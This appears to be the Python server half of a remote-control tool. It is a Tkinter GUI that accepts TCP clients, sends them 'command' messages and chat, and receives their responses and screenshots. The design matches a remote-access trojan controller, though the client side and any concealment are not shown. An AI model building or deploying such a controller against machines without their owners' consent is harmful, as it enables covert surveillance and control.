"""
Server implementation.
"""

import socket
import threading
import signal
import sys
import json
import tkinter as tk
from tkinter import messagebox
from server_gui import ServerGUI
from utils.logger import Logger
from utils.constants import DEFAULT_HOST, DEFAULT_PORT

class Server:
    def __init__(self):
        """Initialize the server."""
        self.root = tk.Tk()
        self.gui = ServerGUI(self.root, self)
        self.logger = Logger("Server")
        
        self.HOST = DEFAULT_HOST
        self.PORT = DEFAULT_PORT
        self.server_running = True
        
        self.setup_server()
        self.setup_signal_handlers()
        
        # Start accepting connections
        self.accept_thread = threading.Thread(target=self.accept_clients, daemon=True)
        self.accept_thread.start()
    
    def setup_server(self):
        """Set up the server socket."""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.HOST, self.PORT))
        self.server.listen(5)
        
        self.gui.log_message(f"[*] Server listening on {self.HOST}:{self.PORT}...")
    
    def setup_signal_handlers(self):
        """Set up signal handlers for graceful shutdown."""
        signal.signal(signal.SIGINT, self.handle_signal)
        signal.signal(signal.SIGTERM, self.handle_signal)
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def handle_signal(self, signum, frame):
        """Handle system signals."""
        self.on_closing()
    
    def accept_clients(self):
        """Accept incoming client connections."""
        while self.server_running:
            try:
                conn, addr = self.server.accept()
                client_id = len(self.gui.clients) + 1
                
                # Add client to GUI
                self.gui.add_client(client_id, addr)
                # Store the connection
                self.gui.clients[client_id] = (conn, addr)
                
                # Start client handler thread
                threading.Thread(
                    target=self.handle_client,
                    args=(client_id, conn, addr),
                    daemon=True
                ).start()
                
            except Exception as e:
                if self.server_running:
                    self.gui.log_message(f"[!] Error accepting connection: {e}")
                break
    
    def handle_client(self, client_id, conn, addr):
        """Handle client communication."""
        self.gui.log_message(f"[+] Client {client_id} connected from {addr[0]}:{addr[1]}")

        while self.server_running:
            try:
                # Lire la taille du message (8 octets)
                raw_length = b''
                while len(raw_length) < 8:
                    packet = conn.recv(8 - len(raw_length))
                    if not packet:
                        break
                    raw_length += packet
                if not raw_length:
                    break
                message_length = int.from_bytes(raw_length, byteorder='big')

                # Lire le message complet
                data = b''
                while len(data) < message_length:
                    packet = conn.recv(message_length - len(data))
                    if not packet:
                        break
                    data += packet
                if not data:
                    break

                try:
                    message = json.loads(data.decode())
                    message_type = message.get("type")
                    content = message.get("content")

                    if message_type == "chat":
                        self.gui.log_chat(f"Client {client_id}", content)
                    elif message_type == "response":
                        self.gui.log_message(f"[Client {client_id}] {content}")
                    elif message_type == "screenshot":
                        self.gui.display_screenshot(content)
                    elif message_type == "exit":
                        break

                except json.JSONDecodeError as e:
                    self.gui.log_message(f"[!] Invalid message from client {client_id}: {e}")
                    continue

            except Exception as e:
                if self.server_running:
                    self.gui.log_message(f"[!] Error with client {client_id}: {e}")
                break
        
        # Clean up
        conn.close()
        self.gui.remove_client(client_id)
        self.gui.log_message(f"[-] Client {client_id} disconnected")
    
    def send_chat(self, client_id, message):
        """Send chat message to client."""
        try:
            conn, _ = self.gui.clients[client_id]
            if conn:
                data = json.dumps({
                    "type": "chat",
                    "content": message
                }).encode()
                conn.send(data)
                self.gui.log_chat(f"Client {client_id}", f"You: {message}")
        except Exception as e:
            self.gui.log_message(f"[!] Error sending to client {client_id}: {e}")
    
    def send_command(self, client_id, command):
        """Send command to client."""
        try:
            conn, _ = self.gui.clients[client_id]
            if conn:
                data = json.dumps({
                    "type": "command",
                    "content": command
                }).encode()
                conn.send(data)
                self.gui.log_message(f"[*] Command sent to client {client_id}: {command}")
        except Exception as e:
            self.gui.log_message(f"[!] Error sending command to client {client_id}: {e}")
    
    def on_closing(self):
        """Handle window closing."""
        if messagebox.askokcancel("Quit", "Do you really want to quit?"):
            self.server_running = False
            
            # Close server socket
            try:
                self.server.close()
            except:
                pass
            
            # Close GUI
            self.root.destroy()
            sys.exit(0)
    
    def start(self):
        """Start the server."""
        self.root.mainloop()

def main():
    server = Server()
    server.start()

if __name__ == "__main__":
    main()
